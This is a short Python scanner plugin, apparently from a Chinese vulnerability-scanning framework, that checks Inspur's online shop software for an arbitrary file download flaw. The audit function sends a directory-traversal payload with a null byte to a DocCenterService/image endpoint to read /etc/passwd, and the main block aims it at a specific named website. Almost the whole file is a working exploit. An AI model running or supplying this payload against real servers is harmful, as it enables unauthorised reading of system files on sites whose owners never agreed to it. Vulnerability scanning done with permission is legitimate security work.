#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__Author__ = ADO
#_PlugName_ = 浪潮商城任意文件下载
#_FileName_ = langchaoShop.py
#__refer__  = http://www.wooyun.org/bugs/wooyun-2010-093845

import time

def assign(service, arg):
    if service == "ecweb_shop":
        return True, arg

def audit(arg):
    payload = "DocCenterService/image?photo_size=../../../../../../../../../../etc/passwd%00&photo_id=1"
    target = arg + payload
    code, head, body, errcode, _url = curl.curl2(target)
    if code == 200 and '/bin/bash' in body:
        security_hole("Found Vulnerability!"+arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ecweb_shop', 'http://www.postbuy.com.cn/')[1])